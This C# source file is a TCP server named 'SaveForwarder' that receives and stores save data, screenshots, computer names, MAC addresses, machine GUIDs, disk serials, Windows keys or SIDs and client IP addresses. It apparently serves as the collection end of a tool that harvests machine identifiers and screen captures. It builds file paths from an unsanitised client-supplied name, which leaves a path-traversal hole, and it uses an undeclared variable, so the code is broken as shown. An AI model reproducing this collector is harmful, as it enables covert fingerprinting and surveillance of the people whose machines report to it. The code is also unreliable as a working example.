using System;
using System.Collections.Generic;
using System.Linq;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.IO;
using static System.Net.Mime.MediaTypeNames;
using System.Drawing;
using Image = System.Drawing.Image;
using System.Text.RegularExpressions;

namespace Chattuy_Server
{
    class Program
    {
        public struct IPData
        {
            public string ip;
            public string WindowsUserName;
        };

        int netIDs = 0;
        // some vars unused.
        public static List<TcpClient> clients = new List<TcpClient>();
        public static List<IPData> ipDataz = new List<IPData>();
        public static TcpClient client;
        public struct DataStruct
        {
            public ushort DataTypeInfo;
            public int SentByID;
            public string Message;
            public string computerName;
            public byte[] imageData;
            public string machineGuid;
            public string DISK_SERIAL;
            public string Win_Key;
            public string MAC;
        };

        public static void LogByte(byte[] here)
        {
            for (int i = 0; i < here.Length; i++)
            {
                Console.WriteLine(here[i]);
            }
        }

        public static void LogString(string[] here)
        {
            for (int i = 0; i < here.Length; i++) Console.WriteLine(here[i]); // ye literally spamming console.writeline here im lazy lol
        }

        public static DataStruct SerializeDataReceived(byte[] data) // not pasted. fully coded on my own
        {
            
            DataStruct unskribbledData = new DataStruct();
            unskribbledData.MAC = "";
            unskribbledData.computerName = "";
            unskribbledData.machineGuid = "";
            unskribbledData.DISK_SERIAL = "";
            unskribbledData.Win_Key = "";
            // oh boi huge packet incoming but its important for that one way slide yknow yknow...
            try
            {
                unskribbledData.DataTypeInfo = data[0];
                unskribbledData.SentByID = BitConverter.ToInt32(data, 2);
                short len = BitConverter.ToInt16(data, 6);
                unskribbledData.Message = Encoding.ASCII.GetString(data, 8, len);
                short ilen = BitConverter.ToInt16(data, 8 + len);
                Console.WriteLine("Hardware Info length is: " + ilen);
                string data2parse = Encoding.ASCII.GetString(data, 10 + len, ilen);

                int plen = BitConverter.ToInt32(data, 10 + len + ilen);
                unskribbledData.imageData = new byte[plen];
                Buffer.BlockCopy(data, 14 + len + ilen, unskribbledData.imageData, 0, plen);
                Console.WriteLine("Image Data Length: " + plen);
                {
                    string[] lines = data2parse.Split(
         new[] { Environment.NewLine },
         StringSplitOptions.None
     );

                    //init        

                    if (lines.Length > 10) return unskribbledData;
                    for (int i = 0; i < lines.Length; i++)
                    {
                        switch (i)
                        {
                            case 0:
                                unskribbledData.computerName = lines[i];
                                break;
                            case 1:
                                unskribbledData.MAC = lines[i];
                                break;
                            case 2:
                                unskribbledData.machineGuid = lines[i];
                                break;
                            case 3:
                                unskribbledData.DISK_SERIAL = lines[i];
                                break;
                            case 4:
                                unskribbledData.Win_Key = lines[i];
                                break;
                            default:
                                break;
                        }
                    }
                }
            }
            catch
            {
                Console.WriteLine("Crash was catched when serializing data!");
            }
            return unskribbledData;
        }






        // this is pasted from stackoverflow
        private static Random random = new Random();
        public static string RandomString(int length)
        {
            const string chars = "abcdefghijklmnopqrstuvwxyz0123456789";
            return new string(Enumerable.Repeat(chars, length)
                 .Select(s => s[random.Next(s.Length)]).ToArray());
        }
        // pasted code end.
        
        

        public static string SpliceText(string text, int lineLength) 
        {
            return Regex.Replace(text, "(.{" + lineLength + "})", "$1" + Environment.NewLine);
        }

        static void Main(string[] args)
        {


            Console.WriteLine("Save forwarder server by playingo/DEERUX 2020\nHosting server now at your ip adress.");
            Console.Title = "SaveForwarder Server 1.0.1";
            host.Start();
            while (true)
            {


                try {

                    client = host.AcceptTcpClient();

                    if (client != null && client.Connected)
                    {
                        IPEndPoint ep = (IPEndPoint)client.Client.RemoteEndPoint;

                        client.ReceiveTimeout = 30000;
                        client.SendTimeout = 30000;
                        client.Client.ReceiveBufferSize = 4096000;
                        byte[] receivedData = new byte[client.Client.ReceiveBufferSize];
                        client.Client.Receive(receivedData);

                        DataStruct p = new DataStruct();
                        p = SerializeDataReceived(receivedData);
                        Console.WriteLine("A new client connected and we received a packet with type : " + p.DataTypeInfo + " netID : " + p.SentByID + " with Message: " + p.Message + "\nComputer name is: " + p.computerName + "\nMachineGUID: " + p.machineGuid + "\nHard Disk Serial: " + p.DISK_SERIAL + "\nWK: " + p.Win_Key);
                        bool exists = false;
                        bool isNotSameUser = false;
                        for (int i = 0; i < ipDataz.Count; i++)
                        {
                            if (ipDataz[i].ip == ep.Address.ToString())
                            {
                                exists = true;
                                if (ipDataz[i].WindowsUserName != p.computerName)
                                {
                                    isNotSameUser = true;
                                }
                                break;
                            }
                        }
                        if (exists == false)
                        {
                            IPData ipd = new IPData();
                            ipd.ip = ep.Address.ToString();
                            ipd.WindowsUserName = p.computerName;
                            ipDataz.Add(ipd);
                        }



                        if (isNotSameUser == false)
                        {
                            if (Directory.Exists("SaveForwarder/" + p.DataTypeInfo.ToString() + "/downloads/User_" + p.computerName) == false)
                            {
                                Directory.CreateDirectory("SaveForwarder/" + p.DataTypeInfo.ToString() + "/downloads/" + "User_" + p.computerName);
                            }
                            File.WriteAllText("SaveForwarder/" + p.DataTypeInfo.ToString() + "/downloads/User_" + p.computerName + "/" + RandomString(8) + "__" + DateTime.Now.ToString(@"MM\_dd\_yyyy_h") + "_save.dat", p.Message);
                            File.WriteAllText("SaveForwarder/" + p.DataTypeInfo.ToString() + "/downloads/User_" + p.computerName + "/" + DateTime.Now.ToString(@"MM\_dd\_yyyy_h") + "_info.txt", "IP: " + ep.Address + Environment.NewLine + "MachineGuid: " + p.machineGuid + Environment.NewLine + "MAC Addresses: " + Environment.NewLine + SpliceText(p.MAC, 12) + Environment.NewLine + "---------------------------------------------" + Environment.NewLine + "Hard Disk Serial Number: " + p.DISK_SERIAL + Environment.NewLine + "SID: " + p.Win_Key + Environment.NewLine);
                            File.WriteAllBytes("SaveForwarder/" + p.DataTypeInfo.ToString() + "/downloads/User_" + p.computerName + "/" + DateTime.Now.ToString(@"MM\_dd\_yyyy_h\_mm") + ".bmp", p.imageData);

                            receivedData = null;
                            p = default(DataStruct);
                            client.Close();
                       }                      
                    }
                }
                catch (Exception ex)
                {
                    Console.WriteLine(ex.Message);
                }
            }
        }       
    }
}
